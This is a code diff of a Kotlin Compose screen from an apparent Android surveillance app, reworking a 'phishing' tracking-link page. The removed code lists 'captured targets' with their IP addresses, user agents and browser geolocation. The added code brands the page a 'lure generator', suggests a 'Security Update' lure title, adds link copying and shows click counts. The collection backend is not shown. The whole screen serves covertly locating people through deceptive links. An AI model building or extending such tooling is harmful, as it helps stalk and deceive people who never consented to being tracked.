@@ -1,35 +1,36 @@
 package com.egbe.surveillance.ui.screens
 
+import android.content.ClipData
+import android.content.ClipboardManager
+import android.content.Context
+import android.widget.Toast
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.verticalScroll
+import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.filled.ContentCopy
+import androidx.compose.material.icons.filled.Link
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
+import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
-import com.egbe.surveillance.ui.theme.EGBEAmber
-import com.egbe.surveillance.ui.theme.EGBEGreen
-import com.egbe.surveillance.ui.theme.EGBERed
+import com.egbe.surveillance.data.model.PhishingCampaign
 import com.egbe.surveillance.ui.theme.EGBECyan
+import com.egbe.surveillance.ui.theme.EGBEGreen
+import com.egbe.surveillance.ui.theme.EGBEAmber
 import com.egbe.surveillance.viewmodel.SurveillanceViewModel
-import kotlinx.coroutines.delay
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun PhishingScreen(vm: SurveillanceViewModel) {
-    var title by remember { mutableStateOf("Document Shared") }
+    var title by remember { mutableStateOf("") }
     var redirect by remember { mutableStateOf("https://google.com") }
     val campaign = vm.phishingCampaign.value
-    var polling by remember { mutableStateOf(false) }
-
-    LaunchedEffect(campaign?.id, polling) {
-        while (polling && campaign != null) {
-            vm.refreshCampaign(campaign.id)
-            delay(5000)
-        }
-    }
+    val context = LocalContext.current
 
     Column(
         modifier = Modifier
@@ -37,86 +38,115 @@ fun PhishingScreen(vm: SurveillanceViewModel) {
             .verticalScroll(rememberScrollState())
             .padding(16.dp)
     ) {
-        Text("LINK TRACKER", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 14.sp, color = EGBEAmber, letterSpacing = 2.sp)
-        Spacer(modifier = Modifier.height(8.dp))
-        Text("Generate a tracking link to discover target location via browser geolocation.", fontSize = 12.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))
+        Text(
+            "LURE GENERATOR",
+            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
+            fontSize = 15.sp,
+            color = EGBECyan,
+            letterSpacing = 2.sp
+        )
+        Spacer(modifier = Modifier.height(6.dp))
+        Text(
+            "Create tracking links • Clicks stored locally",
+            fontSize = 11.sp,
+            color = androidx.compose.ui.graphics.Color(0xFF94A3B8)
+        )
 
-        Spacer(modifier = Modifier.height(16.dp))
+        Spacer(modifier = Modifier.height(20.dp))
 
         OutlinedTextField(
             value = title,
             onValueChange = { title = it },
-            label = { Text("PAGE TITLE") },
+            label = { Text("Campaign Title") },
+            placeholder = { Text("Security Update") },
+            singleLine = true,
             modifier = Modifier.fillMaxWidth(),
-            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = EGBEAmber, focusedLabelColor = EGBEAmber)
-        )
-
-        Spacer(modifier = Modifier.height(8.dp))
-
-        OutlinedTextField(
-            value = redirect,
-            onValueChange = { redirect = it },
-            label = { Text("REDIRECT URL") },
-            modifier = Modifier.fillMaxWidth(),
-            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = EGBEAmber, focusedLabelColor = EGBEAmber)
+            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = EGBECyan, focusedLabelColor = EGBECyan)
         )
 
         Spacer(modifier = Modifier.height(12.dp))
 
+        OutlinedTextField(
+            value = redirect,
+            onValueChange = { redirect = it },
+            label = { Text("Redirect URL") },
+            placeholder = { Text("https://example.com") },
+            singleLine = true,
+            modifier = Modifier.fillMaxWidth(),
+            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = EGBECyan, focusedLabelColor = EGBECyan)
+        )
+
+        Spacer(modifier = Modifier.height(16.dp))
+
         Button(
             onClick = { vm.createPhishingLink(title, redirect) },
             modifier = Modifier.fillMaxWidth(),
-            colors = ButtonDefaults.buttonColors(containerColor = EGBEAmber)
+            colors = ButtonDefaults.buttonColors(containerColor = EGBECyan)
         ) {
             Text("GENERATE TRACKING LINK", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontWeight = FontWeight.Bold)
         }
 
         if (campaign != null) {
-            Spacer(modifier = Modifier.height(24.dp))
-            Text("CAMPAIGN ACTIVE", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 12.sp, color = EGBEGreen)
+            Spacer(modifier = Modifier.height(28.dp))
+            CampaignCard(campaign, context)
+        }
+    }
+}
 
-            Card(
-                modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp),
-                colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1A2332)),
-                border = androidx.compose.foundation.BorderStroke(1.dp, androidx.compose.ui.graphics.Color(0xFFFFFFFF).copy(alpha = 0.08f))
-            ) {
-                Column(modifier = Modifier.padding(16.dp)) {
-                    Text("URL", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 10.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))
-                    Text(campaign.url, fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 12.sp, color = EGBECyan)
-                    Spacer(modifier = Modifier.height(8.dp))
-                    Text("CLICKS: ${campaign.clicks.size}", fontWeight = FontWeight.Bold, color = EGBEGreen)
-                }
+@Composable
+fun CampaignCard(campaign: PhishingCampaign, context: Context) {
+    Card(
+        modifier = Modifier.fillMaxWidth(),
+        colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1A2332)),
+        border = androidx.compose.foundation.BorderStroke(1.dp, androidx.compose.ui.graphics.Color(0xFFFFFFFF).copy(alpha = 0.08f))
+    ) {
+        Column(modifier = Modifier.padding(16.dp)) {
+            Text(
+                campaign.title,
+                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
+                fontSize = 15.sp,
+                color = EGBEGreen,
+                fontWeight = FontWeight.Bold
+            )
+            Spacer(modifier = Modifier.height(8.dp))
+
+            Text("Tracking URL", color = androidx.compose.ui.graphics.Color(0xFF94A3B8), fontSize = 11.sp)
+            Text(
+                campaign.trackingUrl,
+                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
+                fontSize = 13.sp,
+                color = androidx.compose.ui.graphics.Color.White,
+                modifier = Modifier.padding(top = 2.dp, bottom = 8.dp)
+            )
+
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                AssistChip(
+                    onClick = {
+                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                        clipboard.setPrimaryClip(ClipData.newPlainText("tracking", campaign.trackingUrl))
+                        Toast.makeText(context, "Link copied", Toast.LENGTH_SHORT).show()
+                    },
+                    label = { Text("Copy Link") },
+                    leadingIcon = { Icon(Icons.Default.ContentCopy, contentDescription = null, modifier = Modifier.size(16.dp)) }
+                )
             }
 
-            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                Button(
-                    onClick = { polling = !polling },
-                    colors = ButtonDefaults.buttonColors(containerColor = if (polling) EGBERed else EGBEGreen)
-                ) {
-                    Text(if (polling) "STOP POLLING" else "LIVE POLL", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 11.sp)
-                }
-            }
+            Spacer(modifier = Modifier.height(12.dp))
+            Divider(color = androidx.compose.ui.graphics.Color(0xFF334155))
+            Spacer(modifier = Modifier.height(12.dp))
 
-            Spacer(modifier = Modifier.height(16.dp))
-            Text("CAPTURED TARGETS", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 11.sp, color = EGBEAmber)
-
-            campaign.clicks.forEach { click ->
-                Card(
-                    modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
-                    colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF111827))
-                ) {
-                    Column(modifier = Modifier.padding(12.dp)) {
-                        Text("IP: ${click.ip}", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 12.sp)
-                        Text("UA: ${click.user_agent.take(40)}...", fontSize = 10.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))
-                        if (click.lat != null && click.lon != null) {
-                            Text("📍 ${click.lat}, ${click.lon} (±${click.accuracy}m)", fontSize = 12.sp, color = EGBEGreen)
-                        } else {
-                            Text("📍 Location denied by target", fontSize = 12.sp, color = EGBERed)
-                        }
-                        Text(click.timestamp, fontSize = 10.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))
-                    }
-                }
+            Row(modifier = Modifier.fillMaxWidth()) {
+                StatItem("Clicks", campaign.clicks.toString(), Modifier.weight(1f))
+                StatItem("Unique", campaign.uniqueClicks.toString(), Modifier.weight(1f))
             }
         }
+    }
+}
+
+@Composable
+fun StatItem(label: String, value: String, modifier: Modifier = Modifier) {
+    Column(modifier = modifier, horizontalAlignment = Alignment.CenterHorizontally) {
+        Text(value, fontSize = 20.sp, fontWeight = FontWeight.Bold, color = EGBEAmber)
+        Text(label, fontSize = 11.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))
     }
 }
